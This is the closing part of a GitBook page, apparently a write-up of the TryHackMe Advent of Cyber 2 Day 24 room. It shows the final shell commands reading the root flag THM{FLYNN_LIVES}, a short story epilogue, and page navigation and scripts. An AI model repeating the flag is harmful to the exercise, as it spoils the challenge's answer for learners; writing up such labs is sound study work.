+<pre><code class="lang-bash">~ <span class="hljs-comment"># cd /mnt/root/root/</span>
+/mnt/root/root <span class="hljs-comment"># cat root.txt</span>
+THM{FLYNN_LIVES}
+
+
+
+<span class="hljs-string">&quot;As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word &apos;HOLO&apos; embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!&quot;</span>
+</code></pre>
+<hr>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="Day23-TheGrinchstrikesagain.html" class="navigation navigation-prev " aria-label="Previous page: Day 23 - The Grinch strikes again!">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../WebFundamentals.html" class="navigation navigation-next " aria-label="Next page: Web Fundamentals">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Day 24 - The Trial Before Christmas","level":"2.2.24","depth":2,"next":{"title":"Web Fundamentals","level":"2.3","depth":1,"path":"TryHackMe/WebFundamentals.md","ref":"TryHackMe/WebFundamentals.md","articles":[]},"previous":{"title":"Day 23 - The Grinch strikes again!","level":"2.2.23","depth":2,"path":"TryHackMe/AdventofCyber2/Day23-TheGrinchstrikesagain.md","ref":"TryHackMe/AdventofCyber2/Day23-TheGrinchstrikesagain.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"TryHackMe/AdventofCyber2/Day24-TheTrialBeforeChristmas.md","mtime":"2021-02-13T18:58:48.120Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-02-13T19:16:38.703Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
